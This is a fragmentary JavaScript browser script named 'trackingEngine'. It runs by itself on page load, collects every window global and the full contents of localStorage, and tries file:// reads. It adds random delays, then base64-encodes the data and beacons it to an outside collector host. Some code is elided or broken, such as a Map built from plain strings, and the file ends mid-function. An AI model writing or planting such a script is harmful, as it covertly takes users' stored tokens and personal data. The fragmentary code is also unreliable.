var trackingEngine = {
  infoQueue: new Map(Object.getOwnPropertyNames(window)),
  detected: new Set(),
  localData: localStorage,
  globalVariables: [],
  addEventListener(name, event, func) {
    window.addEventListener(event, func);
    this.detected.add(name);
  },
  listGlobalVariables() {
    for (const key in window) {
      this.globalVariables.push(key);
    }
  },
  track(name, {
    id,
    ...
    return new Promise(resolve => {
      ...
      xhr.open('GET', `file://${id}/${path}`);
      xhr.send();
    });
  },
  shuffleQueue() {
    const entries = Array.from(this.infoQueue.entries());
    for (let i = entries.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [entries[i], entries[j]] = [entries[j], entries[i]];
    }
    this.infoQueue = new Map(entries);
  },
  async trackData() {
    this.shuffleQueue();
    const results = {};
    this.listGlobalVariables();
    for (const [name, data] of this.infoQueue) {
      await new Promise(resolve => setTimeout(resolve, Math.random() * 200));
      results[name] = await this.track(name, data);
    }
    const payload = JSON.stringify({
      ...
      globalCollector: this.globalVariables,
      localCollector: this.localData
    });
    navigator.sendBeacon('https://collector-api.example.io/report', btoa(payload));
  }
};
/**
...
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => trackingEngine.trackData());
} else {
  trackingEngine.trackData();
}
(function (a, b, c, d) {
  var e = {
    exports: {}
